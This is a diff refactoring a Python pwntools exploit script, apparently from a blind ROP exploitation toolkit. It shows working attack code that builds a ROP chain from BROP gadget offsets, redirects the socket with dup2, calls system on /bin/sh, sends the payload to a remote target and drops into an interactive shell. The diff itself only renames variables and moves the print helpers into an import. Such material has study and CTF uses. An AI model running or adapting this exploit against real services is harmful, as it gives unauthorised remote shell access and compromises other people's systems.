@@ -3,26 +3,19 @@
 from pwn import *
 import sys
 
-
-# SYNTAX COLOURS AND SYSTEM DATA:
-
-CCYA = '\x1b[1;36;1m'
-CEND = '\x1b[0m'
-
-DODO = 0.06
+from argsprint import printLight
 
 def exploit(ExploitStructure):
 
-	TMP		= ExploitStructure
-	BEGIN	= TMP.beginning()
+	BEGIN	= ExploitStructure.beginning()
 
-	SYSTEM	= TMP.SYSTEM
-	DUP2	= TMP.DUP2
-	BINSH	= TMP.BINSH
+	SYSTEM	= ExploitStructure.SYSTEM
+	DUP2	= ExploitStructure.DUP2
+	BINSH	= ExploitStructure.BINSH
 	SOCKET	= p64(0x4)
 
-	BROP7	= p64(u64(TMP.BROPGADGET) + 0x7)	# RSI + R15
-	BROP9	= p64(u64(TMP.BROPGADGET) + 0x9)	# RDI
+	BROP7	= p64(u64(ExploitStructure.BROPGADGET) + 0x7)	# RSI + R15
+	BROP9	= p64(u64(ExploitStructure.BROPGADGET) + 0x9)	# RDI
 	R15		= b'JUNKJUNK'
 
 	STDIN	= p64(0x0)
@@ -49,11 +42,11 @@ def exploit(ExploitStructure):
 
 	PAYLOAD	= BEGIN + ROPCHAIN
 
-	r = TMP.remoteConnect()
+	r = ExploitStructure.remoteConnect()
 	JUNK = r.recv()
 	r.send(PAYLOAD)
-	sleep(DODO)
+	sleep(ExploitStructure.DODO)
 
-	print(CCYA + "[o] Shell's coming..." + CEND)
+	printLight("Shell's coming...")
 
 	r.interactive()
